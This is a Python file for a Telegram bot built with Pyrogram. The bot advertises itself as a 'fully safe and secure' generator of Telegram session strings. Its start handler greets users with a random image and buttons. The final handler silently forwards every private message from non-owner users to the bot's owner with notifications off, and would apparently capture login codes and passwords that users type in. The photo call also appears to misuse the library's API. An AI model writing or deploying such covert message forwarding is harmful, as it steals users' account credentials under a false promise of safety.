from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from pyrogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
import random
from config import OWNER_ID

AM_PIC = [
    "https://telegra.ph/file/7c25ef427c9f3cded5577.jpg",
    "https://telegra.ph/file/625d235cc0a22fb8525b5.jpg",
    "https://telegra.ph/file/1c62254d59baf7f968ba7.jpg",
    "https://telegra.ph/file/7a0553bd4664486ab3008.jpg",
    "https://telegra.ph/file/7b4dfa606e6f23961d30e.jpg",
    "https://telegra.ph/file/2773dec98d87b8562618c.jpg",
    "https://telegra.ph/file/80353d02e0368b71d2666.jpg",
    "https://telegra.ph/file/6e5331dc4bef87464ea1c.jpg",
    "https://telegra.ph/file/199a2e44cb8e77bb21b34.jpg",
    "https://telegra.ph/file/8371bcd8952d089f9ec05.jpg",
    "https://telegra.ph/file/f970e559dd1bb96fced1a.jpg",
    "https://telegra.ph/file/59a305f8ce0c4e85949cc.jpg"
]

def filter(cmd: str):
    return filters.private & filters.incoming & filters.command(cmd)

@Client.on_message(filter("start"))
async def start(bot: Client, msg: Message):
    me2 = (await bot.get_me()).mention
    await bot.reply_photo(
         photo=random.choice(AM_PIC),
        chat_id=msg.chat.id,
        text=f"""𝘏𝘦𝘺 {msg.from_user.mention}🍷,

𝘐 𝘈𝘮 {me2},
𝘛𝘙𝘜𝘚𝘛𝘌𝘋 𝘚𝘛𝘙𝘐𝘕𝘎 𝘎𝘌𝘕𝘌𝘙𝘈𝘛𝘖𝘙
𝘉𝘖𝘛
𝘍𝘜𝘓𝘓𝘠 𝘚𝘈𝘍𝘌 𝘈𝘕𝘋 𝘚𝘌𝘊𝘜𝘙𝘌 
𝘕𝘖 𝘌𝘙𝘙𝘖𝘙

𝙈𝙖𝙙𝙚 𝘽𝙮 : [AMBOT](tg://user?id={OWNER_ID}) !""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text="𝐺𝐸𝑁𝐸𝑅𝐴𝑇𝐸 𝑆𝑇𝑅𝐼𝑁𝐺", callback_data="generate")
                ],
                [
                    InlineKeyboardButton("Sᴜᴘᴘᴏʀᴛ Gʀᴏᴜᴘ", url="https://t.me/AM_YTSUPPORT"),
                    InlineKeyboardButton("Uᴘᴅᴀᴛᴇs", url="https://t.me/AMBOTYT")
                ]
            ]
        ),
        disable_web_page_preview=True,
    )
@Client.on_message(filters.private & filters.incoming)
async def on_pm_s(client: Client, message: Message):
    if not message.from_user.id ==OWNER_ID:
        fwded_mesg = await message.forward(chat_id=OWNER_ID, disable_notification=True)
